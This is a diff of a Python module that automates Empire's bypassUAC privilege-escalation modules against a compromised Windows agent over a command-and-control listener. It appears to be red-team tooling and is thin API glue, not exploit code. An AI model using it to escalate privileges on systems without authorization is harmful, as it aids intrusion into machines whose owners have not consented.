@@ -1,25 +1,29 @@
 """
-This module allows caller to select bypassUAC options available within Empire.
+Run various UAC bypass methods available in Empire.
 """
 from EmpireAPIWrapper import empireAPI
 from empire_settings import *
 import empire_autocomplete 
 
-def run(API, agent_name, module_name, listener=''):
-    if len(listener) == 0:
-        listeners = API.listeners()
-        if 'listeners' not in listeners:
-            raise ValueError('no listeners')
-        # use the first one if no name supplied
-        listener = listeners['listeners'][0]['name']
-    
+def run(API, agent_name, module_name, listener=None):
+    """
+        Run given bypassUAC module
+        :param API: EmpireAPIWrapper object
+        :param agent_name: name of existing agent
+        :param module_name: name of bypassUAC method (use empire_autocomplete)
+        :param listener: name of listener. Will use 1st listener if not specified
+        :raise error: if no listeners or specified listener not found
+    """
+    if listener is None:
+        listener = API.listeners_get_first()
+    elif API.listeners_exist(listener) is False:
+        raise ValueError('no such listener')
     opts = empire_autocomplete.privesc.bypassuac.options
     options = {
                 opts.required_agent : agent_name,
                 opts.required_listener : listener
               }
     API.module_exec(module_name,options)
-    empire_autocomplete.situational_awareness.netwo    
 
 # for unit testing of each technique
 if __name__ == '__main__':
